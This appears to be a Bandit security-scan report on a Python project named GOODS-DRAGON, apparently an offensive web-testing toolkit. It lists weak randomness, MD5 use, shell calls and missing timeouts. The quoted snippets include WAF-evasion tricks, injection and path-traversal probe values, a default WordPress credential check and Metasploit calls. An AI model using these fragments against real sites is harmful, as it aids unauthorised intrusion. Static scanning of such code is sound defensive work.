@@ -1,0 +1,2375 @@
+Run started:2026-08-07 11:59:38.379699+00:00
+
+Test results:
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/core/animations.py:148:40
+147	            line = "".join(
+148	                random.choice(chars) if random.random() > 0.5 else " "
+149	                for _ in range(width)
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/core/animations.py:148:16
+147	            line = "".join(
+148	                random.choice(chars) if random.random() > 0.5 else " "
+149	                for _ in range(width)
+
+--------------------------------------------------
+>> Issue: [B404:blacklist] Consider possible security implications associated with the subprocess module.
+   Severity: Low   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_imports.html#b404-import-subprocess
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/core/dependency_checker.py:9:0
+8	import importlib
+9	import subprocess
+10	import sys
+
+--------------------------------------------------
+>> Issue: [B603:subprocess_without_shell_equals_true] subprocess call - check for execution of untrusted input.
+   Severity: Low   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/core/dependency_checker.py:50:16
+49	            try:
+50	                subprocess.check_call(
+51	                    [sys.executable, "-m", "pip", "install", package_name],
+52	                    stdout=subprocess.DEVNULL,
+53	                    stderr=subprocess.DEVNULL,
+54	                )
+55	                log_success(f"{package_name} installed successfully!")
+
+--------------------------------------------------
+>> Issue: [B605:start_process_with_a_shell] Starting a process with a shell, possible injection detected, security issue.
+   Severity: High   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b605_start_process_with_a_shell.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/core/menu.py:11:4
+10	def clear_screen():
+11	    os.system("clear" if os.name != "nt" else "cls")
+12	
+
+--------------------------------------------------
+>> Issue: [B605:start_process_with_a_shell] Starting a process with a shell, possible injection detected, security issue.
+   Severity: High   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b605_start_process_with_a_shell.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/core/menu.py:107:4
+106	    print()
+107	    os.system(cmd)
+108	    input(f"\n  Press Enter for menu...")
+
+--------------------------------------------------
+>> Issue: [B112:try_except_continue] Try, Except, Continue detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b112_try_except_continue.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/core/network.py:24:8
+23	            return url, response.status_code
+24	        except:
+25	            continue
+26	    return None, None
+
+--------------------------------------------------
+>> Issue: [B404:blacklist] Consider possible security implications associated with the subprocess module.
+   Severity: Low   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_imports.html#b404-import-subprocess
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/core/sound.py:24:8
+23	        # Try playsound
+24	        import subprocess
+25	
+
+--------------------------------------------------
+>> Issue: [B104:hardcoded_bind_all_interfaces] Possible binding to all interfaces.
+   Severity: Medium   Confidence: Medium
+   CWE: CWE-605 (https://cwe.mitre.org/data/definitions/605.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b104_hardcoded_bind_all_interfaces.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/main.py:562:21
+561	
+562	        app.run(host="0.0.0.0", port=5000, debug=False)
+563	        sys.exit(0)
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/ai_scanner.py:50:27
+49	        analysis = {
+50	            "target_type": random.choice(["web_app", "api", "server", "mobile"]),
+51	            "risk_score": random.randint(1, 10),
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/ai_scanner.py:51:26
+50	            "target_type": random.choice(["web_app", "api", "server", "mobile"]),
+51	            "risk_score": random.randint(1, 10),
+52	            "recommended_modules": [],
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/ai_scanner.py:53:41
+52	            "recommended_modules": [],
+53	            "vulnerability_probability": random.choice(
+54	                ["low", "medium", "high", "critical"]
+55	            ),
+56	        }
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/ai_scanner.py:76:34
+75	        for vuln_type, payloads in self.ai_patterns.items():
+76	            selected[vuln_type] = random.sample(payloads, min(3, len(payloads)))
+77	            log_success(f"Selected {len(selected[vuln_type])} payloads for {vuln_type}")
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/ai_scanner.py:86:15
+85	        for param in params:
+86	            if random.random() > 0.5:
+87	                adapted[param] = random.choice(["1'", "test", "admin", "../../"])
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/ai_scanner.py:87:33
+86	            if random.random() > 0.5:
+87	                adapted[param] = random.choice(["1'", "test", "admin", "../../"])
+88	                log_success(
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/async_http.py:49:36
+48	                    print(f"[!] Attempt {attempt+1} failed: {e}")
+49	                await asyncio.sleep(random.uniform(0.5, 2.0))
+50	        return None
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/browser_emulator.py:54:20
+53	        if self.proxy_list:
+54	            proxy = random.choice(self.proxy_list)
+55	            options.add_argument(f"--proxy-server={proxy}")
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/browser_emulator.py:96:19
+95	        if self.proxy_list:
+96	            return random.choice(self.proxy_list)
+97	        return None
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/browser_emulator.py:100:16
+99	    def random_delay(self, min_delay=1.0, max_delay=5.0):
+100	        delay = random.uniform(min_delay, max_delay)
+101	        if self.verbose:
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/http_client.py:61:20
+60	        if self.proxy_list:
+61	            proxy = random.choice(self.proxy_list)
+62	            return {"http": proxy, "https": proxy}
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/http_client.py:67:20
+66	        if self.verbose:
+67	            delay = random.uniform(min_delay, max_delay)
+68	            log_debug(f"Sleeping for {delay:.2f} seconds...")
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/http_client.py:71:23
+70	        else:
+71	            time.sleep(random.uniform(min_delay, max_delay))
+72	
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/http_client.py:78:27
+77	        params = urllib.parse.parse_qs(parsed.query)
+78	        params["_"] = [str(random.randint(100000, 999999))]
+79	        new_query = urllib.parse.urlencode(params, doseq=True)
+
+--------------------------------------------------
+>> Issue: [B324:hashlib] Use of weak MD5 hash for security. Consider usedforsecurity=False
+   Severity: High   Confidence: High
+   CWE: CWE-327 (https://cwe.mitre.org/data/definitions/327.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b324_hashlib.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/payload_manager.py:90:40
+89	                    if "id" not in payload:
+90	                        payload["id"] = hashlib.md5(
+91	                            payload.get("value", "").encode()
+92	                        ).hexdigest()[:8]
+93	                    if "hash" not in payload:
+
+--------------------------------------------------
+>> Issue: [B324:hashlib] Use of weak MD5 hash for security. Consider usedforsecurity=False
+   Severity: High   Confidence: High
+   CWE: CWE-327 (https://cwe.mitre.org/data/definitions/327.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b324_hashlib.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/payload_manager.py:94:42
+93	                    if "hash" not in payload:
+94	                        payload["hash"] = hashlib.md5(
+95	                            payload.get("value", "").encode()
+96	                        ).hexdigest()
+97	
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/payload_manager.py:487:19
+486	        if payloads:
+487	            return random.choice(payloads)
+488	        return None
+
+--------------------------------------------------
+>> Issue: [B324:hashlib] Use of weak MD5 hash for security. Consider usedforsecurity=False
+   Severity: High   Confidence: High
+   CWE: CWE-327 (https://cwe.mitre.org/data/definitions/327.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b324_hashlib.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/payload_manager.py:498:28
+497	        if "id" not in payload:
+498	            payload["id"] = hashlib.md5(payload.get("value", "").encode()).hexdigest()[
+499	                :8
+
+--------------------------------------------------
+>> Issue: [B324:hashlib] Use of weak MD5 hash for security. Consider usedforsecurity=False
+   Severity: High   Confidence: High
+   CWE: CWE-327 (https://cwe.mitre.org/data/definitions/327.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b324_hashlib.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/payload_manager.py:503:26
+502	        # Generate hash
+503	        payload["hash"] = hashlib.md5(payload.get("value", "").encode()).hexdigest()
+504	
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/proxy_manager.py:72:24
+71	                                        )
+72	                        except:
+73	                            pass
+74	                    else:
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/proxy_manager.py:156:23
+155	            else:
+156	                return random.choice(self.proxies)
+157	
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/stealth.py:26:15
+25	    def get_random_user_agent(self):
+26	        return random.choice(self.user_agents)
+27	
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/stealth.py:30:20
+29	        if self.proxy_list:
+30	            proxy = random.choice(self.proxy_list)
+31	            return {"http": proxy, "https": proxy}
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/stealth.py:46:16
+45	    def random_delay(self):
+46	        delay = random.uniform(0.5, 2.0)
+47	        log_info(f"⏳ Sleeping for {delay:.2f} seconds...")
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/stealth_pro.py:45:15
+44	    def get_random_user_agent(self):
+45	        return random.choice(self.user_agents)
+46	
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/stealth_pro.py:49:20
+48	        if self.proxy_list:
+49	            proxy = random.choice(self.proxy_list)
+50	            return {"http": proxy, "https": proxy}
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/stealth_pro.py:67:16
+66	    def random_delay(self, min_delay=1.0, max_delay=3.0):
+67	        delay = random.uniform(min_delay, max_delay)
+68	        if self.verbose:
+
+--------------------------------------------------
+>> Issue: [B404:blacklist] Consider possible security implications associated with the subprocess module.
+   Severity: Low   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_imports.html#b404-import-subprocess
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/updater.py:6:0
+5	import os
+6	import subprocess
+7	import sys
+
+--------------------------------------------------
+>> Issue: [B103:set_bad_file_permissions] Chmod setting a permissive mask 0o755 on file (main.py).
+   Severity: Medium   Confidence: High
+   CWE: CWE-732 (https://cwe.mitre.org/data/definitions/732.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b103_set_bad_file_permissions.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/updater.py:72:16
+71	                os.rename("main.py.new", "main.py")
+72	                os.chmod("main.py", 0o755)
+73	                log_success("Update applied successfully!")
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/user_agents.py:51:11
+50	
+51	    return random.choice(USER_AGENTS)
+52	
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/waf_bypass.py:62:20
+61	        if self.proxy_list:
+62	            proxy = random.choice(self.proxy_list)
+63	            return {"http": proxy, "https": proxy}
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/waf_bypass.py:68:20
+67	        if self.random_delay:
+68	            delay = random.uniform(min_delay, max_delay)
+69	            if self.verbose:
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/waf_bypass.py:76:25
+75	        if "?" in url:
+76	            url += f"&_={random.randint(100000, 999999)}"
+77	        else:
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/waf_bypass.py:78:25
+77	        else:
+78	            url += f"?_={random.randint(100000, 999999)}"
+79	        return url
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/waf_evasion.py:26:23
+25	        """تغییر حالت حروف (مثلاً SeLeCt)"""
+26	        return "".join(random.choice([c.upper(), c.lower()]) for c in payload)
+27	
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/waf_evasion.py:46:15
+45	        for i in range(len(chars)):
+46	            if random.random() < 0.2:
+47	                chars.insert(i, random.choice([" ", "\t", "\n"]))
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/waf_evasion.py:47:32
+46	            if random.random() < 0.2:
+47	                chars.insert(i, random.choice([" ", "\t", "\n"]))
+48	        return "".join(chars)
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/waf_evasion.py:52:31
+51	        """تزریق پارامترهای تکراری"""
+52	        return f"{payload}&id={random.randint(1,999)}"
+53	
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/waf_evasion.py:61:25
+60	        modified = payload
+61	        for technique in random.sample(self.techniques, random.randint(1, 3)):
+62	            try:
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/waf_evasion.py:61:56
+60	        modified = payload
+61	        for technique in random.sample(self.techniques, random.randint(1, 3)):
+62	            try:
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/core/waf_evasion.py:64:12
+63	                modified = technique(modified)
+64	            except:
+65	                pass
+66	        return modified
+
+--------------------------------------------------
+>> Issue: [B404:blacklist] Consider possible security implications associated with the subprocess module.
+   Severity: Low   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_imports.html#b404-import-subprocess
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/exploit/dev.py:4:0
+3	
+4	import subprocess
+5	
+
+--------------------------------------------------
+>> Issue: [B607:start_process_with_partial_path] Starting a process with a partial executable path
+   Severity: Low   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b607_start_process_with_partial_path.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/exploit/dev.py:53:21
+52	        try:
+53	            result = subprocess.run(
+54	                ["msfconsole", "-q", "-x", f"use {module_name}; show options; exit"],
+55	                capture_output=True,
+56	                text=True,
+57	                timeout=10,
+58	            )
+59	            return result.stdout
+
+--------------------------------------------------
+>> Issue: [B603:subprocess_without_shell_equals_true] subprocess call - check for execution of untrusted input.
+   Severity: Low   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/exploit/dev.py:53:21
+52	        try:
+53	            result = subprocess.run(
+54	                ["msfconsole", "-q", "-x", f"use {module_name}; show options; exit"],
+55	                capture_output=True,
+56	                text=True,
+57	                timeout=10,
+58	            )
+59	            return result.stdout
+
+--------------------------------------------------
+>> Issue: [B404:blacklist] Consider possible security implications associated with the subprocess module.
+   Severity: Low   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_imports.html#b404-import-subprocess
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/exploit/exploit.py:5:0
+4	import socket
+5	import subprocess
+6	
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/exploit/exploit.py:37:49
+36	                "service": "wordpress",
+37	                "payload": {"username": "admin", "password": "password"},
+38	                "check": lambda t: requests.get(f"{t}/wp-admin", timeout=5).status_code
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/recon/ad_enum.py:28:8
+27	                return
+28	        except:
+29	            pass
+30	        self.results["dc"] = None
+
+--------------------------------------------------
+>> Issue: [B113:request_without_timeout] Call to requests without timeout
+   Severity: Medium   Confidence: Low
+   CWE: CWE-400 (https://cwe.mitre.org/data/definitions/400.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b113_request_without_timeout.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/recon/censys.py:26:20
+25	        auth_url = "https://search.censys.io/api/v1/account"
+26	        auth_resp = requests.get(auth_url, auth=(self.api_id, self.api_secret))
+27	        if auth_resp.status_code != 200:
+
+--------------------------------------------------
+>> Issue: [B113:request_without_timeout] Call to requests without timeout
+   Severity: Medium   Confidence: Low
+   CWE: CWE-400 (https://cwe.mitre.org/data/definitions/400.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b113_request_without_timeout.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/recon/censys.py:34:19
+33	        try:
+34	            resp = requests.get(search_url, auth=(self.api_id, self.api_secret))
+35	            if resp.status_code == 200:
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
